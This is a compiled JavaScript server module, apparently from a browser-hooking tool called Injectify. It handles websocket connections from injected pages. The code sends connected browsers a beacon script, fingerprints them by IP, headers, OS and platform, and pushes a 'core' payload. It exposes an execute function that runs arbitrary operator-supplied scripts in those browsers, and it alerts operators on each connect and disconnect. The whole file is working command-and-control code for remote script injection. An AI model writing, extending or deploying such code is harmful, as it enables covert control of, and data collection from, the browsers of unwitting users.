"use strict";
exports.__esModule = true;
var ClientInfo_1 = require("./ClientInfo");
var InjectAPI_1 = require("./InjectAPI");
var chalk_1 = require("chalk");
var RateLimiter = require('limiter').RateLimiter;
var atob = require('atob');
var getIP = require('../modules/getIP.js');
var default_1 = /** @class */ (function () {
    function default_1(db) {
        this.db = db;
    }
    default_1.prototype.validate = function (socket) {
        var _this = this;
        return new Promise(function (resolve, reject) {
            var url = socket.url.split('?');
            if (url) {
                var state_1 = {
                    project: url[url.length - 1],
                    debug: false
                };
                if (state_1.project.charAt(0) === '$') {
                    state_1 = {
                        project: state_1.project.substring(1),
                        debug: true
                    };
                }
                if (state_1.project) {
                    try {
                        state_1.project = atob(state_1.project);
                    }
                    catch (e) {
                        reject('websocket with invalid base64 encoded project name, terminating');
                        return;
                    }
                    _this.db.collection('projects', function (err, projects) {
                        if (err)
                            throw err;
                        projects.findOne({
                            'name': state_1.project
                        }).then(function (doc) {
                            if (doc !== null) {
                                resolve({
                                    project: {
                                        id: doc['_id'],
                                        name: doc.name,
                                        inject: doc.inject
                                    },
                                    id: +new Date(),
                                    debug: state_1.debug
                                });
                            }
                            else {
                                reject("websocket connection to nonexistent project \"" + state_1.project + "\", terminating");
                            }
                        });
                    });
                }
                else {
                    reject('websocket connection with invalid project name, terminating');
                }
            }
            else {
                reject('websocket connection with missing project name, terminating');
            }
        });
    };
    default_1.prototype.initiate = function (socket) {
        this.validate(socket).then(function (project) {
            new Session(socket, project);
        })["catch"](function (error) {
            if (typeof error === 'string') {
                if (global.config.verbose)
                    console.error(chalk_1["default"].redBright('[inject] ') +
                        chalk_1["default"].yellowBright(error));
            }
            else {
                throw error;
            }
        });
    };
    return default_1;
}());
exports["default"] = default_1;
var Session = /** @class */ (function () {
    function Session(socket, session) {
        this.socket = socket;
        this.session = session;
        this.project = session.project;
        this.auth(socket.id);
    }
    Session.prototype.send = function (topic, data) {
        this.socket.write(JSON.stringify({
            t: topic,
            d: data
        }));
    };
    Session.prototype.auth = function (id) {
        var _this = this;
        this.send('auth', "var server=ws.url.split(\"/\"),protocol=\"https://\";\"ws:\"===server[0]&&(protocol=\"http://\"),server=protocol+server[2];var auth=new Image;auth.src=server+\"/a?id=" + encodeURIComponent(id) + "&z=" + +new Date() + "\";auth.onload");
        global.inject.authenticate[id] = function (token, req) { return _this.authorized(token, req); };
    };
    Session.prototype.authorized = function (token, req) {
        var _this = this;
        this.token = token;
        this.req = req;
        var injectAPI;
        var limiter = new RateLimiter(global.config.rateLimiting.inject.websocket.max, global.config.rateLimiting.inject.websocket.windowMs, true);
        this.socket.on('data', function (raw) {
            limiter.removeTokens(1, function (err, remainingRequests) {
                if (!(err || remainingRequests < 1)) {
                    var topic = void 0;
                    var data = void 0;
                    try {
                        raw = JSON.parse(raw);
                        if (typeof raw.t !== 'string')
                            return;
                        topic = raw.t;
                        data = raw.d;
                    }
                    catch (e) {
                        return;
                    }
                    if (injectAPI.on[topic])
                        injectAPI.on[topic](data);
                }
                else {
                    _this.send('error', 'Too many requests! slow down');
                }
            });
        });
        this.socket.on('close', function () {
            /**
             * Remove them from the clients object
             */
            if (global.inject.clients[_this.project.id][token].sessions.length === 1) {
                /**
                 * Only session left with their token, delete token
                 */
                delete global.inject.clients[_this.project.id][token];
            }
            else {
                /**
                 * Other sessions exist with their token
                 */
                global.inject.clients[_this.project.id][_this.token].sessions = global.inject.clients[_this.project.id][token].sessions.filter(function (session) { return session.id !== _this.session.id; });
            }
            /**
             * Callback to the Injectify users
             */
            if (global.inject.watchers[_this.project.id]) {
                setTimeout(function () {
                    global.inject.watchers[_this.project.id].forEach(function (watcher) {
                        watcher.callback('disconnect', {
                            token: token,
                            id: _this.session.id
                        });
                    });
                }, 0);
            }
        });
        /**
         * Add the session to the global sessions object
         */
        this.ledge(function (_a) {
            var client = _a.client, session = _a.session;
            /**
             * Log to console
             */
            if (global.config.debug) {
                console.log(chalk_1["default"].greenBright('[inject] ') +
                    chalk_1["default"].yellowBright('new websocket connection for project ') +
                    chalk_1["default"].magentaBright(_this.project.name) +
                    chalk_1["default"].yellowBright(' from ') +
                    chalk_1["default"].magentaBright(client.ip.query));
            }
            /**
             * Set the client object
             */
            _this.client = {
                client: client,
                session: session
            };
            /**
             * Enable access to the inject API
             */
            injectAPI = new InjectAPI_1["default"](_this);
            /**
             * Callback to the Injectify users
             */
            if (global.inject.watchers[_this.project.id]) {
                setTimeout(function () {
                    global.inject.watchers[_this.project.id].forEach(function (watcher) {
                        watcher.callback('connect', {
                            token: _this.token,
                            data: global.inject.clients[_this.project.id][_this.token]
                        });
                    });
                }, 0);
            }
            /**
             * Send the inject core
             */
            var core = global.inject.core;
            if (_this.session.debug)
                core = global.inject.debugCore;
            var socketHeaders = _this.socket.headers;
            delete socketHeaders['user-agent'];
            core = core
                .replace('client.ip', JSON.stringify(client.ip))
                .replace('client.id', JSON.stringify(session.id))
                .replace('client.agent', JSON.stringify(client.agent))
                .replace('client.headers', JSON.stringify(socketHeaders))
                .replace('client.platform', JSON.stringify(client.platform))
                .replace('client.os', JSON.stringify(client.os));
            _this.send('core', core);
            /**
             * Send the auto-execute script
             */
            // if (project.inject) {
            //   if (project.inject.autoexecute) {
            //     send('execute', project.inject.autoexecute)
            //   }
            // }
        });
    };
    Session.prototype.ledge = function (resolve) {
        var _this = this;
        /**
         * Create an object for the project
         */
        if (!global.inject.clients[this.project.id]) {
            global.inject.clients[this.project.id] = {};
        }
        ClientInfo_1["default"](this.socket, this.req, this.session).then(function (_a) {
            var client = _a.client, session = _a.session;
            /**
             * Create an object for the client
             */
            if (!global.inject.clients[_this.project.id][_this.token]) {
                global.inject.clients[_this.project.id][_this.token] = client;
            }
            /**
             * Add a reference to the send method
             */
            session.execute = function (script) {
                _this.send('execute', script);
            };
            global.inject.clients[_this.project.id][_this.token].sessions.push(session);
            resolve({
                client: client,
                session: session
            });
        });
    };
    return Session;
}());
